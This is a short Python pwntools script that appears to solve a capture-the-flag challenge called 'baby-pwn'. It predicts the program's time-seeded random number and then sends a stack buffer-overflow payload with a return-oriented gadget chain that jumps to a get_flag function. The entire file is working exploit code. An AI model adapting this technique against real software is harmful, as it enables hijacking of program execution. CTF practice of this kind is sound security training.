#!/usr/bin/env python3

from pwn import *
from ctypes import *

elf = context.binary = ELF("./baby-pwn")
io = process()

pop_rdi = 0x00000000004014e3
ret = 0x000000000040101a
arg = 0xdeadbeef

libc = cdll.LoadLibrary(elf.libc.path)
_time = libc.time(0x0)
libc.srand(_time)
guess = libc.rand()
offset = 136
io.sendlineafter(b">> ", str(guess).encode())
payload = flat(b'A' * offset, pop_rdi, arg, ret, elf.sym.get_flag)
io.sendlineafter(b"you", payload)
io.interactive()
